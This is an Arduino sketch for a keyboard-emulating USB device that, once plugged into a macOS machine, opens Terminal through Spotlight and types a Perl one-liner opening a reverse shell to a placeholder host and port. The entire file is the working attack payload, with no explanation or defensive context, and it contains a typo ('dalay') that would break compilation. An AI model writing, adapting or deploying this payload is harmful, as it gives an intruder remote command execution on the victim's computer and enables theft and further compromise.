void setup()
{
  Keyboard.begin();
}

void loop()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print(F("perl -MIO -e '$p=fork;exit,if"));
  delay(100);
  Keyboard.print(F("($p);$c=new IO::Socket::INET"));
  delay(100);
  Keyboard.print(F("(PeerAddr,\"INPUT0:INPUT1\""));
  delay(100);
  Keyboard.print(F(");STDIN->fdopen($c,r);$~->"));
  delay(100);
  Keyboard.print(F("fdopen($c,w);system$_ "));
  delay(100);
  Keyboard.println(F("while<>;'"));
  while(true);
}

void run(char *SomeCommand){
  //on Yosemite you launch spotlight with CTRL+SPACEBAR
  //not APPLE+SPACEBAR
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(' ');
  dalay(500);
  Keyboard.releaseAll();

  Keyboard.println(SomeCommand);
}

